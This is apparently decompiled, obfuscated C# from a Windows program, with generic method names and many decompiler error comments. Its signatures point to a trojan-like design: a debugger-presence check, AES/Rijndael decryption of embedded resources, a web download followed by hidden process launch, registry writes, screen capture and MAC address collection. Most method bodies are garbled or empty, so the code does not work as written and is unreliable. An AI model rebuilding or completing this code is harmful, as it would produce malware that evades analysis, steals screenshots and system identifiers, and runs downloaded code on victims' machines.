using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	private static FileSystemWatcher fileSystemWatcher_0;

	private static extern void smethod_0();

	private static extern void smethod_1(string string_4, string string_5, bool bool_5);

	public static extern string smethod_2(string string_4);

	private static extern void Main();

	private static extern string smethod_3();

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	private unsafe static bool smethod_4()
	{
		//Discarded unreachable code: IL_000d, IL_0011
		//IL_0001: Invalid comparison between Unknown and I4
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		ushort num;
		do
		{
			num = ((ushort[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		}
		while ((int)/*Error near IL_0006: Stack underflow*/ == num);
		_ = *(short*)(nint)/*Error near IL_0007: Stack underflow*/;
		/*Error near IL_0007: ldarg 0 (out-of-bounds)*/;
		/*Error near IL_0008: Invalid metadata token*/;
	}

	private static extern void smethod_5();

	private static extern void smethod_6(object sender, FileSystemEventArgs e);

	private static extern void smethod_7();

	public extern Class5();

	static extern string smethod_8(string string_4);

	static extern Assembly smethod_9();

	static Stream smethod_10(Assembly assembly_0, string string_4)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0014, IL_0019, IL_001d, IL_0025, IL_002a, IL_0031
		//IL_0010: Expected O, but got I8
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		/*Error: Invalid metadata token*/;
	}

	static extern string smethod_11(string string_4, string string_5, string string_6);

	static extern FileStream smethod_12(string string_4, FileMode fileMode_0, FileAccess fileAccess_0);

	static extern void smethod_13(Stream stream_0, Stream stream_1);

	static extern void smethod_14(Stream stream_0);

	static extern void smethod_15(IDisposable idisposable_0);

	static extern Process smethod_16();

	unsafe static ProcessStartInfo smethod_17(Process process_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected native int or pointer, but got F8
		ushort num = (ushort)/*Error near IL_0002: Stack underflow*/;
		_ = *(uint*)(nint)(double)(*(int*)(nint)(/*Error near IL_0003: Stack underflow*/ / num));
		/*Error near IL_0009: Invalid metadata token*/;
	}

	static extern void smethod_18(ProcessStartInfo processStartInfo_0, string string_4);

	static extern void smethod_19(ProcessStartInfo processStartInfo_0, bool bool_5);

	static extern void smethod_20(ProcessStartInfo processStartInfo_0, string string_4);

	static extern bool smethod_21(Process process_0);

	unsafe static Process smethod_22(string string_4)
	{
		//Discarded unreachable code: IL_0002, IL_0008, IL_000c, IL_000e, IL_0013, IL_001c, IL_0021, IL_0023
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Incompatible stack heights: 0 vs 1
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		*(_003F*)(nint)/*Error near IL_0001: Stack underflow*/ = /*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0001: Unknown opcode: 0xFB*/;
	}

	static extern byte[] smethod_23(string string_4);

	static extern RijndaelManaged smethod_24();

	static extern void smethod_25(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern void smethod_26(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern Encoding smethod_27();

	static extern byte[] smethod_28(Encoding encoding_0, string string_4);

	static extern void smethod_29(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_30(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_31(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	static extern void smethod_32(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static extern byte[] smethod_33(SymmetricAlgorithm symmetricAlgorithm_0);

	static byte[] smethod_34(SymmetricAlgorithm symmetricAlgorithm_0)
	{
		//Discarded unreachable code: IL_000d, IL_0010
		//IL_0008: Incompatible stack heights: 0 vs 1
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected I4, but got Unknown
		while (true)
		{
			if (/*Error near IL_0005: Stack underflow*/ <= /*Error near IL_0005: Stack underflow*/)
			{
				((IntPtr[])/*Error near IL_0007: Stack underflow*/)[/*Error near IL_0007: Stack underflow*/] = (IntPtr)/*Error near IL_0007: Stack underflow*/;
				/*Error near IL_0007: ldloc 2 (out-of-bounds)*/;
			}
		}
	}

	static extern ICryptoTransform smethod_35(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static extern byte[] smethod_36(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1);

	static extern Encoding smethod_37();

	unsafe static string smethod_38(Encoding encoding_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0011, IL_0016, IL_001f
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		_003F val;
		do
		{
			val = /*Error near IL_0003: Stack underflow*/^ 6;
		}
		while (/*Error near IL_0009: Stack underflow*/ >= val);
		*(_003F*)(nint)/*Error near IL_000a: Stack underflow*/ = /*Error near IL_000a: Stack underflow*/;
		/*Error near IL_000c: Invalid metadata token*/;
	}

	static extern WebClient smethod_39();

	static extern Rectangle smethod_40(Point point_0);

	static extern Bitmap smethod_41(int int_0, int int_1);

	static extern Graphics smethod_42(Image image_0);

	static extern void smethod_43(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	static extern string smethod_44(string string_4, string string_5);

	static extern ImageFormat smethod_45();

	static void smethod_46(Image image_0, string string_4, ImageFormat imageFormat_0)
	{
		_ = 1824011363;
	}

	static bool smethod_47(string string_4)
	{
		//Discarded unreachable code: IL_0007, IL_000e
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			_ = /*Error near IL_0001: Stack underflow*/* /*Error near IL_0001: Stack underflow*/;
			/*Error near IL_0002: Invalid metadata token*/;
		}
	}

	static extern void smethod_48(string string_4);

	static extern void smethod_49(WebClient webClient_0, string string_4, string string_5);

	static extern ProcessStartInfo smethod_50();

	static extern void smethod_51(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static void smethod_52(Process process_0, ProcessStartInfo processStartInfo_0)
	{
		//Discarded unreachable code: IL_0004, IL_000e, IL_0013
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected I4, but got Unknown
		_ = (byte)((sbyte[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		/*Error near IL_0003: Unknown opcode: 0xF9*/;
	}

	static extern void smethod_53(Process process_0);

	static extern string smethod_54(Assembly assembly_0);

	static void smethod_55(string string_4, string string_5, bool bool_5)
	{
	}

	static RegistryKey smethod_56(RegistryKey registryKey_0, string string_4, bool bool_5)
	{
		//Discarded unreachable code: IL_0005, IL_000a, IL_0011, IL_0017, IL_0022, IL_002d
		//IL_0013: Expected O, but got I8
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Incompatible stack heights: 0 vs 2
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_57(RegistryKey registryKey_0, string string_4, object object_0);

	static extern Assembly smethod_58();

	static extern string smethod_59(string string_4);

	static extern bool smethod_60(string string_4, string string_5);

	static extern string smethod_61(string string_4);

	static extern string[] smethod_62(string string_4, char[] char_0);

	static extern string smethod_63(WebClient webClient_0, string string_4);

	static extern string smethod_64();

	static extern string smethod_65(string[] string_4);

	static void smethod_66(int int_0)
	{
		//Discarded unreachable code: IL_0007, IL_000d
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		_ = /*Error near IL_0001: Stack underflow*/+ /*Error near IL_0001: Stack underflow*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	static extern NetworkInterface[] smethod_67();

	static OperationalStatus smethod_68(NetworkInterface networkInterface_0)
	{
		//Discarded unreachable code: IL_0005, IL_000e, IL_0014, IL_0019
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static extern PhysicalAddress smethod_69(NetworkInterface networkInterface_0);

	static extern string smethod_70(object object_0);

	static string smethod_71(string string_4, char[] char_0)
	{
		/*Error: Unexpected end of block*/;
	}

	static extern Process smethod_72();

	static extern IntPtr smethod_73(Process process_0);

	static extern FileSystemWatcher smethod_74();

	static extern string smethod_75(Environment.SpecialFolder specialFolder_0);

	static extern void smethod_76(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_77(FileSystemWatcher fileSystemWatcher_1, NotifyFilters notifyFilters_0);

	static extern void smethod_78(FileSystemWatcher fileSystemWatcher_1, string string_4);

	static extern void smethod_79(FileSystemWatcher fileSystemWatcher_1, FileSystemEventHandler fileSystemEventHandler_0);

	static void smethod_80(FileSystemWatcher fileSystemWatcher_1, bool bool_5)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected I8, but got Unknown
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if (/*Error near IL_0005: Stack underflow*/ < /*Error near IL_0005: Stack underflow*/)
			{
				_003F val = /*Error near IL_0006: Stack underflow*/^ /*Error near IL_0006: Stack underflow*/;
				((long[])/*Error near IL_0007: Stack underflow*/)[/*Error near IL_0007: Stack underflow*/] = (long)val;
				byte num = (byte)/*Error near IL_0008: Stack underflow*/;
				_003F val2 = /*Error near IL_0008: ldloc 1 (out-of-bounds)*/;
				if (/*Error near IL_0010: Stack underflow*/ < num * val2)
				{
					/*Error: Could not find block for branch target IL_0010*/;
				}
			}
		}
	}

	static extern byte[] smethod_81(string string_4);

	static extern Encoding smethod_82();

	static extern int smethod_83(string string_4, string string_5);

	static extern string smethod_84(string string_4, int int_0, int int_1);

	static extern string smethod_85(string string_4, int int_0, string string_5);

	static extern void smethod_86(string string_4, byte[] byte_0);
}
